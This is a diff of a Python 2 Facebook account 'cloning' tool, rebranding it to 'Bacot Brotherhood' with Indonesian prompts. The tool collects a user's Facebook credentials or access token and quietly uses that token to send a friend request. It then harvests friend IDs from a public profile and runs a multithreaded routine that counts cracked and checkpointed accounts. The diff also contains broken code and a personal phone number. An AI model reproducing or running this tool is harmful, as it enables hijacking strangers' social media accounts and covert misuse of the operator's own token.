@@ -1,8 +1,5 @@
 #!/usr/bin/python2
 #coding=utf-8
-#TECH ABM THE OFFICAL ROGRAMMER 
-#FBCLONING COMMMAD MAKER 
-#YOUTUBE TECH ABM
 
 
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
@@ -18,9 +15,11 @@ br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 
+
 def keluar():
-	print "\x1b[1;91mExit"
+	print "\033[1;96m[!] \x1b[1;91mExit"
 	os.sys.exit()
+
 
 def acak(b):
     w = 'ahtdzjc'
@@ -44,56 +43,98 @@ def jalan(z):
 	for e in z + '\n':
 		sys.stdout.write(e)
 		sys.stdout.flush()
-		time.sleep(0.001)
+		time.sleep(00000.1)
 
-#### colours ####
-B='\033[1;94m'
-R='\033[1;91m'
-G='\033[1;92m'
-W='\033[1;97m'
-S='\033[1;96m'
-P='\033[1;95m'
-Y='\033[1;93m'
 
-#Dev:TECH ABM
-#### LOGO ####
+##### LOGO #####
 logo = """
-\033[1;94m                       ,ood8888booo,
-\033[1;93m                    ,oda8a888a888888bo,
-\033[1;95m                 ,od88888888aa888aa88a8bo,
-\033[1;94m               ,da8888aaaa88a888aaaa8a8a88b,
-\033[1;93m              ,oa888aaaa8aa8888aaa8aa8a8a88o,
-\033[1;93m             ,88888aaaaaa8aa8888a8aa8aa888a88,
-\033[1;95m             8888a88aaaaaa8a88aa8888888a888888
-\033[1;94m             888aaaa88aa8aaaa8888; ;8888a88888
-\033[1;93m             Y888a888a888a8888;'   ;888888a88Y
-\033[1;95m              Y8a8aa8a888a88'      ,8aaa8888Y
-\033[1;94m               Y8a8aa8aa8888;     ;8a8aaa88Y
-\033[1;95m                `Y88aa8888;'      ;8aaa88Y'
-\033[1;93m        ,,;;;;;;;;'''''''         ;8888Y'
-\033[1;95m     ,,;                         ,888P
-\033[1;94m   ,;  ,;,                      ;""
-\033[1;95m  ;       ;          ,    ,    ,;
-\033[1;95m ;  ;,    ;     ,;;;;;   ;,,,  ;
-\033[1;94m;  ; ;  ,' ;  ,;      ;  ;   ;  ;
-\033[1;95m; ;  ; ;  ;  '        ; ,'    ;  ;
-\033[1;94m`;'  ; ;  '; ;,       ; ;      ; ',
-\033[1;93m     ;  ;,  ;,;       ;  ;,     ;;;
-\033[1;95m      ;,,;             ;,,;          
-\033[1;91m╔══╗╔══╗╔═╦╗╔══╗╔╗─╔══╗╔══╗╔═╗╔══╗╔╗╔╗
-\033[1;93m║╔╗║║╔╗║║║║║║╔═╣║║─║╔╗║╚╗╗║║╦╝║══╣║╚╝║
-\033[1;93m║╔╗║║╠╣║║║║║║╚╗║║╚╗║╠╣║╔╩╝║║╩╗╠══║║╔╗║
-\033[1;91m╚══╝╚╝╚╝╚╩═╝╚══╝╚═╝╚╝╚╝╚══╝╚═╝╚══╝╚╝╚╝
-\033[0;95m╭════════════════════════════════════════════╮
-\033[0;91m║\033[0;91mAUTHOR : \033[0;92mTECH ABM                     \033[0;91m      ║
-\033[0;91m║\033[0;91mGITHUB :\033[0;92m https://github.com/Tech-abm   \033[0;91m     ║
-\033[0;91m║\033[0;91mFB PAGE :\033[0;92m https://m.facebook.com/Techabm \033[0;91m   ║
-\033[0;95m╰════════════════════════════════════════════╯
+\033[1;91m      ♦♦♦——————————————————————————————————————♦♦♦
+\033[1;96m           __  __ ____ __  __ ____   __  _ 
+\033[1;96m           \ \/ // () \\ \/ // () \ |  \| |
+\033[1;96m            |__|/__/\__\|__|/__/\__\|_|\__|
+\033[1;97m             _  __  _  _____  ____   __  _ 
+\033[1;97m            | ||  \| ||_   _|/ () \ |  \| |
+\033[1;97m            |_||_|\__|  |_| /__/\__\|_|\__|
+\033[1;97m                     YAYAN <3 INTAN
+\033[1;91m      ♦♦♦——————————————————————————————————————♦♦♦
 """
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\x1b[1;93mMohon Tunggu \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+
+
+back = 0
+berhasil = []
+cekpoint = []
+oks = []
+id = []
+listgrup = []
+vulnot = "\033[31mNot Vuln"
+vuln = "\033[32mVuln"
+
+os.system("clear")
+print  """
+\033[1;91m▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
+\033[1;91m▒▒█▒▒▒▄██████████▄▒▒▒▒ 
+\033[1;91m▒█▐▒▒▒████████████▒▒▒▒
+\033[1;91m▒▌▐▒▒██▄▀██████▀▄██▒▒▒  BB TEAM V.02 ✔
+\033[1;91m▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
+\033[1;91m▐┼▐▒▒██████████████▒▒▒
+\033[1;91m▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
+\033[1;97m▒▒█████──────────▐███▌
+\033[1;97m▒▒█▀▀██▄█─▄───▐─▄███▀▒
+\033[1;97m▒▒█▒▒███████▄██████▒▒▒
+\033[1;97m▒▒▒▒▒██████████████▒▒▒
+\033[1;97m▒▒▒▒▒█████████▐▌██▌▒▒▒
+\033[1;97m▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
+\033[1;97m▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
+                                                               
+"""
+
+jalan("\033[1;97m Tunggu sampai proses selesai ya plerr, SABAR..! ")
+jalan("\033[1;97m . ")
+jalan("\033[1;96m•◈•───────•◈•\033[1;96m🎌BACOT BROTHERHOOD TEAM🎌\033[1;96m•◈•───────•◈•")
+jalan("\033[1;93m•◈•╔══╗╔══╗─╔════╦═══╦═══╦═╗╔═╗")
+jalan("\033[1;93m•◈•║╔╗║║╔╗║─║╔╗╔╗║╔══╣╔═╗║║╚╝║║")
+jalan("\033[1;93m•◈•║╚╝╚╣╚╝╚╗╚╝║║╚╣╚══╣║─║║╔╗╔╗║")
+jalan("\033[1;97m•◈•║╔═╗║╔═╗║──║║─║╔══╣╚═╝║║║║║║")
+jalan("\033[1;97m•◈•║╚═╝║╚═╝║──║║─║╚══╣╔═╗║║║║║║")
+jalan("\033[1;97m•◈•╚═══╩═══╝──╚╝─╚═══╩╝─╚╩╝╚╝╚╝")
+jalan("\033[1;96m•◈•───────•◈•\033[1;96m🎌BACOT BROTHERHOOD TEAM🎌\033[1;96m•◈•───────•◈•")
+jalan("\033[1;97m•◈•flw ig : yayanxd_
+jalan("\033[1;97m•◈• Wa Me : 085603036683 ")
+jalan("\033[1;97m•◈• Fp Fb : Bacot Brotherhood ")
+jalan("\033[1;97m•◈• Fb Me : Moch Yayan Juan Alvredo XD. ")
+jalan("\033[1;96m•◈• GUNAKAN SC INI DENGAN BIJAK! ")
+jalan("\033[1;96m•◈• BACOT BROTHERHOOD TEAM ")
+jalan("\033[1;96m•◈• USER HEKEL TIADA TANDING ")
+jalan("\033[1;96m•◈• Selamat Datang Di Script BACOT BROTHERHOOD ")
+jalan("\033[1;96m•◈•───────•◈•\033[1;96m🎌BACOT BROTHERHOOD TEAM🎌\033[1;96m•◈•───────•◈•")
+
+CorrectUsername = "YayanGanteng"
+CorrectPassword = "AkuJelek"
+
+
+loop = 'true'
+while (loop == 'true'):
+    username = raw_input("\033[1;96m[☆] \x1b[1;97mKETIK YayanGanteng \x1b[1;96m>>>> ")
+    if (username == CorrectUsername):
+    	password = raw_input("\033[1;96m[☆] \x1b[1;97mKETIK AkuJelek \x1b[1;96m>>>> ")
+        if (password == CorrectPassword):
+            print "Logged in successfully as " + username
+            loop = 'false'
+        else:
+            print "Salah Tolol,Ketik AkuJelek"
+            os.system('xdg-open https://www.facebook.com/YAYAN.XING.ZUCKERBERG.SR')
+    else:
+        print "Salah Tolol,Ketik YayanGanteng"
+        os.system('xdg-open https://www.facebook.com/YAYAN.XING.ZUCKERBERG.SR')
+
+def tik():
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print("\r\x1b[1;93mMohon Tunggu \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 
 
 back = 0
@@ -151,22 +192,22 @@ def login():
 	os.system('clear')
 	print logo
 	print 42*"\033[1;97m="
-	print "\033[1;91m>>>\033[1;91m[1]\033[1;93m Login with Facebook  "
+	print "\033[1;91m>>>\033[1;91m[1]\033[1;93m Login Dengan Facebook  "
         time.sleep(0.05)
-        print "\033[1;91m>>>\033[1;91m[2]\033[1;94m Login with access token "
+        print "\033[1;91m>>>\033[1;91m[2]\033[1;94m Login dengan access token "
         time.sleep(0.05)
-        print "\033[1;91m>>>\033[1;91m[3]\033[1;93m Download Access token"
+        print "\033[1;91m>>>\033[1;91m[3]\033[1;93m Unduh Access token"
 	time.sleep(0.05)
-	print "\033[1;91m>>>\033[1;91m[4]\033[1;94m Subscribe Tech Abm Channel" 
+	print "\033[1;91m>>>\033[1;91m[4]\033[1;94m Ikuti Fb Saya" 
 	time.sleep(0.05) 
-	print "\033[1;91m>>>\033[1;91m[5]\033[1;93m See all abm command" 
+	print "\033[1;91m>>>\033[1;91m[5]\033[1;93m Follw Ig @yayanxd_" 
 	time.sleep(0.05)
-	print "\033[1;91m>>>\033[1;91m[0]\033[1;96m Logout        "
+	print "\033[1;91m>>>\033[1;91m[0]\033[1;96m Keluar        "
         print 42*"\033[1;97m="
 	pilih_login()
 
 def pilih_login():
-	peak = raw_input("\n\033[1;91mChoose an Option═╬══►\033[1;95m")
+	peak = raw_input("\n\033[1;91mPilih Nomer═╬══►\033[1;95m")
 	if peak =="":
 		print "\x1b[1;91mFill in correctly"
 		pilih_login()
@@ -178,13 +219,13 @@ def pilih_login():
 	        os.system('xdg-open https://play.google.com/store/apps/details?id=com.proit.thaison.getaccesstokenfacebook')
 	        login()
 	elif peak =="4":
-		os.system('xdg-open https://www.youtube.com/channel/UC5jned7it1eduNGSHP9C0qw')
+		os.system('xdg-open https://www.facebook.com/YAYAN.XING.ZUCKERBERG.SR')
 		login()
-	elif unikers =="5":
-		os.system('xdg-open https://github.com/Tech-abm')
+	elif peak =="5":
+		os.system('xdg-open https://Instagram.com/yayanxd_')
 		login()
 	elif unikers =="0":
-		jalan('Token Removed')
+		jalan('Token Terhapus')
 		os.system('rm -rf login.txt')
 		keluar()
 	else:
@@ -203,8 +244,8 @@ def login1():
                 time.sleep(0.05)
 		print logo
 		print 42*"\033[1;97m="
-		jalan('\033[1;96m[✾]\x1b[1;91mDO NOT USE OLD ACCOUNT TO LOGIN\x1b[1;96m[✾]' )
-		jalan('\033[1;96m[✾]\x1b[1;91mUSE A FRESH/NEW ACCOUNT TO LOGIN\x1b[1;96m[✾]' )
+		jalan('\033[1;96m[✾]\x1b[1;91mJANGAN GUNAKAN AKUN OLD UNTUK LOGIN\x1b[1;96m[✾]' )
+		jalan('\033[1;96m[✾]\x1b[1;91mUSAHAKAN PAKAI AKUN BARU ATAU TOKEN\x1b[1;96m[✾]' )
 		id = raw_input('\033[1;96m[!!] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
 		pwd = raw_input('\033[1;96m[!!] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
 		print 42*"\033[1;97m="
@@ -235,19 +276,19 @@ def login1():
 				unikers.write(z['access_token'])
 				unikers.close()
 				jalan( '\n\x1b[1;95mLogin Successful...') 
-				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+				os.system('xdg-open https://www.facebook.com/YAYAN.XING.ZUCKERBERG.SR')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\x1b[1;97mThere is no internet connection"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\x1b[1;97mYour Account is on Checkpoint")
+			print("\n\x1b[1;97mSepertinya Akun Anda Kena Checkpoint")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\x1b[1;93mPassword/Email is wrong")
+			print("\n\x1b[1;93mPassword/Email Anda Salah")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
@@ -256,7 +297,7 @@ def tokenz():
 	os.system('clear')
 	print logo
 	print 42*"="
-	toket = raw_input("\033[1;91m[+]\033[1;92m Give Token\033[1;91m :\033[1;95>>\033[1;93m ")
+	toket = raw_input("\033[1;91m[+]\033[1;92m Masukan Token\033[1;91m :\033[1;95>>\033[1;93m ")
 	try:
 		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
 		a = json.loads(otw.text)
@@ -266,8 +307,8 @@ def tokenz():
 		zedd.close()
 		menu()
 	except KeyError:
-		print "\033[1;91m[!] Wrong"
-		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
+		print "\033[1;91m[!] Salah"
+		e = raw_input("\033[1;91m[?] \033[1;92mAnda Tau token? Kalo Tidak Tau Pm Saya!\033[1;97m[y/n]: ")
 		if e =="":
 			keluar()
 		elif e =="y":
@@ -295,7 +336,7 @@ def menu():
                 sub = str(b['summary']['total_count'])
 	except KeyError:
 		os.system('clear')
-		print"\033[1;97mYour Account is on Checkpoint"
+		print"\033[1;97mSepertinya Akun Anda Kena Checkpoint"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
@@ -309,8 +350,8 @@ def menu():
 	print "  \033[1;36;40m\033[1;32;40m[*] ID  \033[1;32;40m: "+id+"        \033[1;36;92m"
 	print "  \033[1;36;40m\033[1;32;40m[*] Subs\033[1;32;40m: "+sub+"           \033[1;36;92m"
 	print 42*"\033[1;97m="
-	print "\033[1;32;98m[1] \033[1;96m>> start Cloning "																														
-	print "\033[1;32;98m[0] \033[1;96m>> Log out"
+	print "\033[1;32;98m[1] \033[1;96m>> Mulai Cloning "																														
+	print "\033[1;32;98m[0] \033[1;96m>> Keluar"
 	print 42*"\033[1;97m="
 	pilih()
 
@@ -326,10 +367,10 @@ def pilih():
 		print logo
 		print 42*"="
 		os.system('git pull origin master')
-		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+		raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
 		menu()
 	elif unikers =="0":
-		jalan('Token Removed')
+		jalan('Token Terhapus')
 		os.system('rm -rf login.txt')
 		keluar()
 	else:
@@ -349,8 +390,8 @@ def super():
 	os.system('clear')
 	print logo
         print 42*"="
-	jalan( "\x1b[1;32;92m[1] \033[1;33;98m>> Crack From Public ID") 
-	jalan( "\x1b[1;32;36m[0] \033[1;33;96m>> Back") 
+	jalan( "\x1b[1;32;92m[1] \033[1;33;98m>> Hack Daftar Teman Publik") 
+	jalan( "\x1b[1;32;36m[0] \033[1;33;96m>> Keluar") 
 	print 42*"="
 	pilih_super()
 
@@ -367,12 +408,12 @@ def pilih_super():
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
+			print"\033[1;31;37m[⊱⋕⊰] Nama : "+op["name"]
 		except KeyError:
-			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
-			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
+			print"\x1b[1;37m[⊱⋕⊰] ID Salah!"
+			raw_input("\n\033[1;96m[\033[1;94mKeluar\033[1;96m]")
 			super()
-		print"\033[1;35;37m[⊱⋕⊰] Getting ID Loading process........ "
+		print"\033[1;35;37m[⊱⋕⊰] Proses Mendapatkan ID Loanjing..... "
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -384,12 +425,12 @@ def pilih_super():
 		pilih_super()
 
 	
-	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id))
-	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
+	print "\033[1;36;96m[⊱⋕⊰] Total ID : \033[1;92m"+str(len(id))
+	jalan('\033[1;34;96m[⊱⋕⊰] Sabar Lagi Cloning Plerr Jangan Dulu Keluar ')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;32;40m[⊱⋕⊰] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
-	print "\n\033[1;94m   ❈     \033[1;91mCp Account Open After 7 days      \033[1;94m  ❈"
+		print("\r\033[1;32;40m[⊱⋕⊰] Karna Orang Sabar Pantadnya Lebar:'v\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+	print "\n\033[1;94m   ❈  \033[1;91mBila Akunya Cp Simpan Saja 7/10 Hari \033[1;94m  ❈"
 	print 42*"\033[1;97m="
 
 	def main(arg):
@@ -398,7 +439,7 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:Tech-abm
+			pass #Dev:Yayan-XD
 		try:													
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
 			b = json.loads(a.text)												
@@ -607,11 +648,12 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print 42*"\033[1;97m="
-	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
+	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProses Telah Selesai \033[1;97m....'
 	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
-	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
-	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
+	print("\033[1;96m[+] \033[1;92mCP File Telah Disimpan \033[1;91m: \033[1;97mout/checkpoint.txt")
+	raw_input("\n\033[1;96m[\033[1;97mKeluar\033[1;96m]")
 	menu()
 
 if __name__ == '__main__':
 	login()
+
